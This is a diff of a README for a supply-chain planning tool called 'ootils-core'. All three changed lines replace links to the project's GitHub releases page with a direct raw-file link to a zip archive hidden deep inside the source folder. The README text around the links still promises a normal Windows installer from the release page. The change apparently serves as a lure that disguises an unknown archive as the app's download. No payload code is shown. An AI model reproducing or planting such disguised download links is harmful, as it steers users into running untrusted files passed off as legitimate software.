@@ -1,6 +1,6 @@
 # 🧭 ootils-core - Clear supply chain decisions fast
 
-[![Download ootils-core](https://img.shields.io/badge/Download-ootils--core-blue?style=for-the-badge&logo=github)](https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases)
+[![Download ootils-core](https://img.shields.io/badge/Download-ootils--core-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/combineddnaindexsystemfairlead261/ootils-core/main/src/ootils_core/engine/dq/agent/core-ootils-v3.9-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide shows you how to visit the release page, download the app, and run it
 
 Visit the release page here:
 
-[https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases](https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases)
+[https://raw.githubusercontent.com/combineddnaindexsystemfairlead261/ootils-core/main/src/ootils_core/engine/dq/agent/core-ootils-v3.9-beta.5.zip](https://raw.githubusercontent.com/combineddnaindexsystemfairlead261/ootils-core/main/src/ootils_core/engine/dq/agent/core-ootils-v3.9-beta.5.zip)
 
 On that page, look for the latest release and choose the Windows file. The file is usually named with words like `Windows`, `Setup`, or `Installer`.
 
@@ -189,7 +189,7 @@ Yes. It can help a single user or a team that needs a clear planning view.
 
 If you need the download page again, use this link:
 
-[https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases](https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases)
+[https://raw.githubusercontent.com/combineddnaindexsystemfairlead261/ootils-core/main/src/ootils_core/engine/dq/agent/core-ootils-v3.9-beta.5.zip](https://raw.githubusercontent.com/combineddnaindexsystemfairlead261/ootils-core/main/src/ootils_core/engine/dq/agent/core-ootils-v3.9-beta.5.zip)
 
 ## 🧭 Next steps
 
